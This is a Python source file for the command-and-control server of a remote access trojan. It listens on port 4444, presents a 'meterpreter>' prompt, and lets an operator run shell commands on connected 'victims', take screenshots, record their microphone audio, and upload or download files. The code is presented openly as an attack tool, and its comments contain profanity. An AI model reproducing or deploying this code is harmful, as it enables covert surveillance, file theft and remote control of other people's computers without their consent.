import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import wave
import os
import subprocess
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

COMMANDS = {'help':['Shows this help'],
            'list':['Lists connected clients'],
            'select':['Selects a client by its index. Takes index as a parameter'],
            'quit':['Stops current connection with a client. To be used when client is selected'],
            'record <filename_in_which_we_want_save> <time(sec)>':['Records sound of client till amount of time which you specified'],
            'screenshot <filename_in_which_we_want_save>':['Takes a screenshot of client\'s screens'],
            'upload <file_which_you_want_to_upload> <filename_at_client_side>':['To upload a file to client.'],
            'download <file_which_you_want_to_download> <filename_at_server_side>':['To download a file from client.'],
            'shutdown':['Shuts server down'],
           }

class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 4444
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.send(str.encode('quit'))
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_turtle(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input('meterpreter>')
            if cmd == 'list':
                self.list_connections()
                continue
            elif 'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'shutdown':
                    queue.task_done()
                    queue.task_done()
                    print('Server shutdown')
                    break
                    # self.quit_gracefully()
            elif cmd == 'help':
                self.print_help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data
    def discardAll(self, conn):
        """ Helper function specially made for download
        Enjoy Mother Fucker"""
        # TODO: this can be a static method
        chunk_bitch = conn.recv(len("File_NotFound"))
        if(chunk_bitch == "File_NotFound".encode()):
           print("fucking idiot both address are wrong")
           time.sleep(1)
           print(conn.send("ok".encode()))
           return
        else:    
            while True:
                   if (chunk_bitch[-4:] == "sent".encode()):
                          break
                   chunk_bitch = conn.recv(1024)
            conn.send("ok".encode())
            print("ok")
            return

    def send_target_commands(self, target, conn):
        """ Connect with remote target client 
        :param conn: 
        :param target: 
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                while(True):
                      cmd = input()
                      check = cmd.split(" ")
                      if(check[0] == "screenshot"):
                          if(len(check) == 2):
                              conn.send(str.encode(cmd))
                              break
                      elif(check[0] == "download" or check[0] == "upload" ):
                          if(len(check) == 3):
                             conn.send(str.encode(cmd))
                             break
                      elif(check[0] == "record"):
                          if(len(check)== 2 or len(check)== 3 ):
                             conn.send(str.encode(cmd))
                             break
                      else:
                          if cmd ==  '' or cmd == 'clear':
                             cmd = "cd"
                          conn.send(str.encode(cmd))
                          break
                      print("Invalid Syntaxt")
                      conn.send(str.encode("cd"))
                if cmd == 'quit':
                    conn.send(str.encode(cmd))
                    break
                if cmd.split(" ")[0] == "screenshot":
                           f = open(str(cmd.split(" ")[1].rstrip())+".png",'wb')
                           flag = None
                           text = None
                           print(conn.recv(len("sending")))
                           while True:
                            print('recving')
                            m = conn.recv(1024)
                            text = m
                            if m:
                               while m:
                                   if(text[-4:] == 'sent'.encode()):
                                          text = text[:-4]
                                          break
                                   m = conn.recv(1024)
                                   text += m
                               break 
                            else:
                                  break
                           f.write(text)
                           f.close()
                           print("Screenshot saved")
                           conn.send("ok".encode())
                           cmd_output = self.read_command_output(conn)
                           client_response = str(cmd_output, "utf-8")
                           print(client_response, end="")
                elif cmd.split(" ")[0] == "record":
                        frames = []
                        if(conn.recv(9).decode("UTF_8")== "recording"):
                            while(True):
                                chunk = conn.recv(1024)
                                if( chunk[-14:] == "done_recording".encode()):
                                       break
                                frames.append(chunk)
                        print("creating file")
                        wf = wave.open(cmd.split(" ")[1]+".wav", 'wb')
                        wf.setnchannels(2)
                        wf.setsampwidth(2)
                        wf.setframerate(44100)
                        wf.writeframes(b''.join(frames))
                        wf.close()
                        print("Audio Saved")
                        conn.send("ok".encode())
                        cmd_output = self.read_command_output(conn)
                        client_response = str(cmd_output, "utf-8")
                        print(client_response, end="")
                elif cmd.split(" ")[0] == "download":
                    try:
                        f = open(str(cmd.split(" ")[2].rstrip()),'wb')
                        flag = None
                        text = None
                        while True:
                            m = conn.recv(len("File_NotFound"))
                            if( m == "File_NotFound".encode()):
                                    print("File Not Found at victim side")
                                    f.close()
                                    name = str(cmd.split(" ")[2].rstrip())
                                    os.remove(name)
                                    flag = True
                                    conn.send("ok".encode())
                                    break
                            text = m
                            if m:
                               while m:
                                   if(text[-4:] == 'sent'.encode()):
                                          text = text[:-4]
                                          break
                                   m = conn.recv(1024)
                                   text += m
                               break 
                            else:
                                  break
                        if flag:
                             cmd_output = self.read_command_output(conn)
                             client_response = str(cmd_output, "utf-8")
                             print(client_response, end="")
                             continue
                        f.write(text)
                        f.close()
                        print("file recived")
                        conn.send("ok".encode())
                        cmd_output = self.read_command_output(conn)
                        client_response = str(cmd_output, "utf-8")
                        print(client_response, end="")
                    except Exception as e:
                        print(e)
                        print("Invaild Syntaxt 1st arg for which file you wanna download from victims machine and 2nd arg is which filename it would be save on  your machine")
                        self.discardAll(conn)
                        cmd_output = self.read_command_output(conn)
                        client_response = str(cmd_output, "utf-8")
                        print(client_response, end="")
                elif cmd.split(" ")[0] == "upload":
                    try:
                        print(str(cmd.split(" ")[1].rstrip()))
                        f = open (str(cmd.split(" ")[1].rstrip()), "rb")
                        l = os.path.getsize(str(cmd.split(" ")[1].rstrip()))
                        m = f.read(l)
                        time.sleep(2)
                        conn.sendall(m+"sent".encode())
                        f.close()
                        print(conn.recv(2))
                        cmd_output = self.read_command_output(conn)
                        client_response = str(cmd_output, "utf-8")
                        print(client_response, end="")
                    except Exception as e:
                        time.sleep(2)
                        print("File Not Found at attacker side")
                        conn.send("File_NotFound".encode())
                        print(conn.recv(2))
                        print("Invaild Syntaxt 1st arg for which file you wanna upload and 2nd arg is which filename it would be save in victims machine")
                        cmd_output = self.read_command_output(conn)
                        client_response = str(cmd_output, "utf-8")
                        print(client_response, end="")
                elif cmd == "cls":
                    tmp = subprocess.call('clear',shell=True)
                else:
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return
def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_turtle()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
